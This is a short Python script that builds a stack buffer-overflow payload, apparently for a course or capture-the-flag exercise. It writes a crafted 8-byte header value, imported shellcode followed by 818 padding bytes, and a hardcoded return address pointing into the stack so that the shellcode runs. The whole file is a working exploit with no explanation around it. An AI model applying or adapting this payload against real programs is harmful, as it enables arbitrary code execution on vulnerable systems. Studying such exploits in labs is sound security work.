#!/usr/bin/env python3

import sys

from shellcode import shellcode


sys.stdout.buffer.write(0x40000000000000c8.to_bytes(8,'little'))
# sys.stdout.buffer.write(b'A'*8)
sys.stdout.buffer.write(shellcode + b'0'*818)
# sys.stdout.buffer.write(b'0'*170)
sys.stdout.buffer.write(0x7ffffff6dfd0.to_bytes(8, 'little'))